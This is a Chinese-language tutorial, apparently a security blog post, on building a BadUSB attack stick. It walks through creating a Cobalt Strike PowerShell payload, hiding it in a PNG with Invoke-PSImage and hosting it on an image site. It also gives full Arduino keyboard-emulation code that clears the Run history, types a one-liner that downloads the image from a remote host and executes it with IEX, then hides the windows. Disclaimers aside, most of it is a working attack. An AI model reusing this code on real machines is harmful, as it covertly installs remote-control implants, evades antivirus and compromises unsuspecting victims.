***严正声明：本文仅限于技术讨论与分享，严禁用于非法途径。**

原理简介：Badusb的原理是将恶意代码预置在固件之中，当受害人插入USB时，就会执行恶意代码进行恶意操作。Badusb将恶意代码预存在U盘的固件中，导致PC上的杀毒软件无法应对BadUsb的攻击。
BadUSB就是通过对U盘的固件进行逆向重新编程，改写了U盘的操作系统而进行攻击的。

实现步骤：

1.Cobalt-strike生成Powershell payload.  
![image](https://image.3001.net/images/20210504/1620137836_6091576c3df63dd39db2b.png!small)

2.自行从网上找一1920*1080高清壁纸，接下来要将木马免杀进PNG图片。

免杀工具地址：https://github.com/peewpw/Invoke-PSImage

介绍：Invoke-PSImage使用PowerShell脚本并将该脚本的字节编码为PNG图像的像素。 它从Web的文件中生成一个oneliner来执行。

它可以仅使用有效载荷数据来创建新图像，也可以将有效载荷嵌入到现有图像的最低有效字节中，以便看起来像实际的图片。
图像保存为PNG，并且可以无损压缩，而不会影响执行有效载荷的能力，因为数据本身以颜色存储。
创建新映像时，通常会对常规PowerShell脚本进行显着压缩，通常会生成png，其文件大小约为原始脚本的50％。

将生成的Payload.ps1和网上的图片放在Invoke-PSimage同一目录下，按下Shift+鼠标右键进入Powershell命令行，输入如下命令：

    
    
    Import-Module .\Invoke-PSImage.ps1
     Invoke-PSImage -Script .\payload.ps1 -Out haha.png -Image .\1.png -WebClient
    

会发现生成如下的命令：![image](https://image.3001.net/images/20210504/1620137848_609157780e5261572bf77.png!small)

当这个语句放入Powershell执行的时候，CS就会上线目标机器，但是不会触发杀软，简单原理就是远程下载带有恶意代码的图片，然后进行运行，那么接下来一步就是将带有混淆代码的图片上传到互联网上。（使用Cobalt-strike的钓鱼文件下载具有时效性，不如图床稳定)

3.上传到图床，目前互联网上的图床上传限制皆为5M,这里我找了一个比较好的图床。

链接如下:https://www.hualigs.cn/

上传完图片后将原有代码进行修改替换，修改后如下：

    
    
    sal a New-Object;Add-Type -A System.Drawing;$g=a System.Drawing.Bitmap((a Net.WebClient).OpenRead("https://xxx//xxx.png"));$o=a Byte[] 4000;(0..7)|%{foreach($x in(0..499)){$p=$g.GetPixel($x,$_);$o[$_*500+$x]=([math]::Floor(($p.B-band15)*16)-bor($p.G -band 15))}};IEX([System.Text.Encoding]::ASCII.GetString($o[0..3554]))
    

这样在Powershell模式下运行就会进行上线  
![image](https://image.3001.net/images/20210504/1620137907_609157b3b74b5ffecf74c.png!small)

4.接下来就是将恶意代码执行的命令烧录进BadUsb.

使用到的软件是Arduino IDE，使用的Badusb为淘宝某热销。

Badusb的核心逻辑就是模拟键盘操作，那么我们的入侵思路是目标插入Badusb的一段时间内使其失去对电脑的控制权限，从而给我们足够是时间让恶意代码执行，从网页上下载带有Payload的PNG进行执行。那么我们的思路可以是这样的：

    
    
    #1.插入USB后缓存一定时间让电脑足够识别
    #2.按下Win+r,并且以最小化打开CMD,并且删除注册表记录
    #3.进入Powershell模式
    #4.在Powershell模式下执行恶意代码，同时让目标失去对电脑的控制权
    #5.执行完恶意代码后按下Win+M,此时所有应用最小化。
    

对应的arduino代码如下，具体可以自己魔改，相应的函数作用不再赘述。

    
    
    void setup() {//初始化
      Keyboard.begin();//开始键盘通讯 
      delay(5000);//延时
      Keyboard.press(KEY_LEFT_GUI);//win键 
      delay(500); 
      Keyboard.press('r');//r键 
      delay(500); 
      Keyboard.release(KEY_LEFT_GUI);
      Keyboard.release('r');
      delay(500); 
      Keyboard.println("cmd.exe /T:01 /K mode CON: COLS=16 LINES=1&ampreg delete HKCU\\Software\\Microsoft\\Windows\\CurrentVersion\\Explorer\\RunMRU /f");
      delay(500); 
      Keyboard.println("Powershell");
      Keyboard.press(KEY_RETURN);
      delay(500);
      Keyboard.release(KEY_RETURN);
      Keyboard.println("sal a New-Object;Add-Type -A System.Drawing;$g=a System.Drawing.Bitmap((a Net.WebClient).OpenRead('https://ae01.alicdn.com/kf/Ud9cc0fc064df44d7a59dea8738cd42504.jpg'));$o=a Byte[] 3840;(0..1)|%{foreach($x in(0..1919)){$p=$g.GetPixel($x,$_);$o[$_*1920+$x]=([math]::Floor(($p.B-band15)*16)-bor($p.G -band 15))}};IEX([System.Text.Encoding]::ASCII.GetString($o[0..3554]))");
      Keyboard.press(KEY_RETURN);
      delay(10000);
      Keyboard.release(KEY_RETURN);
      Keyboard.press(KEY_RETURN);
      delay(5000);
      Keyboard.release(KEY_RETURN);
      Keyboard.println('exit');
      Keyboard.press(KEY_LEFT_GUI);
      delay(500);
      Keyboard.press('m');
      delay(500);
      Keyboard.release(KEY_LEFT_GUI);
      Keyboard.release('m');
      Keyboard.end();//结束键盘通讯 
    }
    void loop()//循环
    {
    }
    

①：注意应将链接内的双引号修改为单引号否则会引起报错。

②：图片上传到图床一定得是PNG格式，jpg格式会导致无法解析！

5.使用Arduino烧录代码到USB中

选择Arduino Leonardo 板 以及COM5端口，将代码编译运行后烧录。  
![image](https://image.3001.net/images/20210504/1620137948_609157dcb0fe41e316729.png!small)再次插入USB，自动运行并且上线。![image](https://image.3001.net/images/20210504/1620137969_609157f1ec53ac3a6faf2.png!small)  
结尾：本文章仅供技术学习参考，希望大家在日常生活中提高安全意识，不给 黑客攻击可乘之机。

